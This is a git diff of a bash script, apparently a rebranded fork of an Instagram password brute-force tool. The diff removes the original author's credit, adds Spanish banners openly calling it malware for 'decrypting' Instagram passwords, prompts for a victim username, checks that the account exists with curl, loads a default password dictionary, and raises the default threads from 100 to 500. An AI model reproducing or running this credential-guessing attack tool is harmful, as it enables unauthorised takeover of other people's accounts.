@@ -1,7 +1,5 @@
 #!/bin/bash
-# Coded by: thelinuxchoice (Don't change, noob!)
-# www.github.com/thelinuxchoice
-# www.instagram.com/linux_choice
+# Coded by: alexxdev
 
 trap 'store; exit 1;' 2
 
@@ -31,17 +29,15 @@ var2=$(echo $var0 | grep -o 'csrftoken=.*' | cut -d ';' -f1 | cut -d '=' -f2)
 banner() {
 
 printf "\n"
+printf "\e[1;77m\e[41m      Bienvenid@ / Welcome!\e[0m\n"
 printf "\n"
 printf "\n"
 printf "\n"
 printf "\n"
+printf "\e[1;95m Tool malware para el "desencriptamiento" de\e[0m\e[1;91m contraseñas de Instagram\e[0m\n"
+printf "\e[1;95m Usar este bot con razonamiento y bajo el consentimiento del\e[0m\e[1;91m autor de dicho crack\e[0m\n"
 printf "\n"
-printf "\n"
-printf "\n"
-printf "\e[1;95m Tool básica e intuitiva para el "desencriptamiento"\e[0m\e[1;91m de contraseñas de Instagram\e[0m\n"
-printf "\e[1;95m Usar este bot con razonamiento y bajo el consentimiento del \e[0m\e[1;91m autor de dicho crack\e[0m\n"
-printf "\n"
-printf "\e[1;95m ~ Reintento con fuerza bruta "desencriptamiento"\e[0m\e[1;91m para inicios de sección.\e[0m\n"
+printf "\e[1;95m ~ Reintento con fuerza bruta y desencriptamiento\e[0m\e[1;91m para inicios de sección.\e[0m\n"
 printf "\n"
 printf "\e[1;77m\e[41m  Instagram BruteForce, Author: @alexx_dev (~ KikicraftMC)  \e[0m\n" #Don't change, noob
 printf "\n"
@@ -49,7 +45,7 @@ printf "\n"
 
 
 function start() {
-read -p $'\e[1;92mVíctima de Instagram: \e[0m' user
+read -p $'\e[1;92mUsuario: \e[0m' user
 checkaccount=$(curl -L -s https://www.instagram.com/$user/ | grep -c "the page may have been removed")
 if [[ "$checkaccount" == 1 ]]; then
 printf "\e[1;91mEste nombre de usuario no existe, prueba otro\e[0m\n"
@@ -57,9 +53,9 @@ sleep 1
 start
 else
 default_wl_pass="passwddicc.lst"
-read -p $'\e[1;92mRuta de diccionario, (Enter) para usar la predeterminada: \e[0m' wl_pass
+read -p $'\e[1;92mEscoge la ruta de diccionario, (Enter) para usar la predeterminada: \e[0m' wl_pass
 wl_pass="${wl_pass:-${default_wl_pass}}"
-default_threads="100"
+default_threads="500"
 threads="${threads:-${default_threads}}"
 fi
 }
